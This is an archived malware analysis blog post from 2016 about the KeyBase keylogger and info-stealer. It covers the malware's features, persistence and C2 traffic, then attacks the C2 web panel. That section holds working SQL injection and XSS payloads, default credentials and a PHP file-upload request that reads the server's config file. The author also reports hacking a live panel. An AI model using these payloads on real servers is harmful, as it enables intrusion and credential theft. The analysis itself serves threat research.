{
    "id": "7b2e2fc0-73af-4736-b8f4-9db53d17e501",
    "created_at": "2023-01-12T15:09:41.079888Z",
    "updated_at": "2025-03-27T02:05:18.531218Z",
    "deleted_at": null,
    "sha1_hash": "c2d4d57cadf15603f6ec0954d1af2b953bef3c85",
    "title": "2016-01-28 - Keybase",
    "authors": "",
    "file_creation_date": "2022-05-28T19:51:56Z",
    "file_modification_date": "2022-05-28T19:51:56Z",
    "file_size": 171482,
    "plain_text": "# Keybase\n\n**voidsec.com/keybase-en/**\n\n**Reading Time: 6**\n\nminutes\n\n\nJanuary 28, 2016\n\n\nRecently, a malware known as KeyBase, is “triggering” some of my sensors. KeyBase was\ndistributed in February 2015 and sold for about $ 50 (in its first version), It remained active\nuntil May and then disappear from internet. During November it is back up with thousands of\ninfections (v1.5).\n\nKeybase is a malware with limited capabilities belonging to the families of keyloggers and\n**info-stealers.**\n\n## Malware Overview\n\nKeybase is written in C# and among its features we can find:\n\n**Keylogging**\nHotLogging(Keylogging ofspecific windows.ex. Paypal, bank accountsetc.)\n\n\n-----\n\n**Password Stealer**\n\nBrowsers (Chrome, FIrefox, Internet Explorer, Opera, Safari)\nClient Email (Outlook, Thunderbird, Incredimail, NetScape, Eudora)\nGeneral Purpose Software (FileZilla, JDownloader, IDM, Imvu, PalTalk)\nTaking Screenshot of the entire screen or specific windows\nSteal the contents of the Clipboard\nAbility to block certain Web sites\nVisit a website during the malware startup\n**Self-destruction upon reaching a specific date**\n\n## Code Analysis\n\nCode is not particularly difficult to read as it is not obfuscated, it also contains the command\nand control server information “hard–coded” into the source code.\n\n\n-----\n\nYou can locate a key within resources of the program, once compiled, that appears unique\n**to each build performed on the same machine.**\n\nThe author has taken a number of simple obfuscation techniques to strings used in the\ncode.\n\nMainly “replace” and “reverse” operations to characters and strings, in addition to these\noperations, all the Microsoft Windows API calls are encrypted.\n\nMalware persistence is obtained by copying the executable in the Startup folder under the\nname of Important.exe (visible in the first block of code). This information cannot be\nchanged by the builder and is statically set in the source code. It also set a key value in the\nregistry as follow:\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run {32 byte}:{exe path}\n\n## Command and Control & Web Panel\n\n\n-----\n\nThe most interesting thing, especially for the poor quality of the code, is the web interface.\n\nAll the communications with the remote server are performed via simple HTTP requests and\nthey are not encrypted.\n\n**KeyBase notification is issued to the remote server once it has been installed:**\n\nNote the absence of certain HTTP headers.\n\nThe Web Control Panel gives you the control on all the information stolen from infected\nmachines as seen in the following image:\n\n## Exploit\n\nDefault credentials for the web panels are: Admin:Admin, KeyBase:Logs123!\n\nAnalyzing the source code of the Web panel, you can identify multiple vulnerabilities:\n\n\n-----\n\nPost.php is vulnerable to SQL Injection (Error & Blind Based) and Cross Site Scripting\n(XSS) because the “machinename, windowtitle, keystrokestyped, machinetime” parameters\nare not filtered in any way.\n\nSqlmap:\n```\nParameter: machinename (GET)\nType: error-based\nTitle: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause\nPayload: machinename=1' AND (SELECT 5650 FROM(SELECT COUNT(*),CONCAT(0x71706b6a71,\n(SELECT (ELT(5650=5650,1))),0x71706a7671,FLOOR(RAND(0)*2))x FROM\nINFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND\n'oAZi'='oAZi&windowtitle=a&keystrokestyped=a&machinetime=a&type=keystrokes\nType: AND/OR time-based blind\nTitle: MySQL >= 5.0.12 AND time-based blind (SELECT)\nPayload: machinename=1' AND (SELECT * FROM (SELECT(SLEEP(5)))GRmL) AND\n'mEfO'='mEfO&windowtitle=a&keystrokestyped=a&machinetime=a&type=keystrokes\n\n```\n\n-----\n\nXSS:\n```\nGET /keybase/post.php?keystrokestyped=a'\"<script>alert('VoidSec')\n</script>&machinename=1&machinetime=a&type=keystrokes&windowtitle=a\n\n```\nThe session cookie is set without the ‘HTTPOnly’ flag allowing the session hijacking through\nthe previous XSS vulnerability.\n\nBy default, the directory “/image/Images“, (destination of the screenshots) does not require\nauthentication, allowing anyone to see the images stored on the server\n\n_Upload.php does not perform any validation on the uploaded file, allowing a third party to_\nupload a PHP script which can compromise the entire C&C server.\n\nYou may also notice how the author forgot the ‘re-naming’ of the uploaded files, the function\ndesigned for this purpose is never used.\n\nBy submitting this request, you can upload a PHP file that allows you to read username and\n**password of the web interface.**\n\nExploit:\n\n\n-----\n\n```\nPOST /image/upload.php HTTP/1.1\nHost: $$VULNERABLE_HOST$$\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nDNT: 1\nConnection: close\nContent-Type: multipart/form-data; boundary=---------------------------34593197730004\nContent-Length: 394\n-----------------------------34593197730004\nContent-Disposition: form-data; name=\"file\"; filename=\"NUBO_12_21_16_48_4.jpg.php\"\nContent-Type: application/octet-stream\n<.?php $file = '../../config.php'; echo file_get_contents($file); ?.>\n-----------------------------34593197730004\nContent-Disposition: form-data; name=\"submit\"\nUpload\n-----------------------------34593197730004-\n## Malware Distribution & Targets\n\n```\nKeyBase, seems to be used to infect devices in over 41 countries, namely: Bosnia and\nHerzegovina, India, Iran, Jordan, Philippines, Serbia, Thailand, United States of America,\nViet Nam.\n\nIts incidence becomes relevant when we talk about the Iran that owns 45% of the infected\n**devices..**\n\n\n-----\n\nSome installations include machines used in the following sectors: industrial, high tech,\nprivate medical offices, higher education, retail industries, government agencies as well\nas to traditional computer households.\n\n\n-----\n\nAmong the bulk of the collected information, while hacking one of the web panels, I was able\nto discover some files regarding the creation of a new Ransomware. I “dumped” all the\nback-end source code and I am currently monitoring the server, trying to retrieve some\nsamples or the executable source code.\n\n**But that’s another story ….**\n\n## Conclusions\n\n\n-----\n\nFinally, despite KeyBase, lacks a few options (Download & Execute, Update) in the current\nlandscape of malware and it appears unsophisticated (lack of encrypted communication\n[and obfuscation) its ease of use, low detection rate and its simplicity by design, makes it](https://www.virustotal.com/en/file/237d2c27eb8a1950d0daf070d015a01d8d1f0973073df8847234ba96e608cb57/analysis/1453587594/)\nuseful for further development and/or further steps in a crypter, allowing the evasion of the\nmost common Anti-Virus products.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2016/2016-01-28 - Keybase.pdf"
    ],
    "report_names": [
        "2016-01-28 - Keybase.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536181,
    "ts_updated_at": 1743041118,
    "ts_creation_date": 1653767516,
    "ts_modification_date": 1653767516,
    "files": {
        "pdf": "https://archive.orkl.eu/c2d4d57cadf15603f6ec0954d1af2b953bef3c85.pdf",
        "text": "https://archive.orkl.eu/c2d4d57cadf15603f6ec0954d1af2b953bef3c85.txt",
        "img": "https://archive.orkl.eu/c2d4d57cadf15603f6ec0954d1af2b953bef3c85.jpg"
    }
}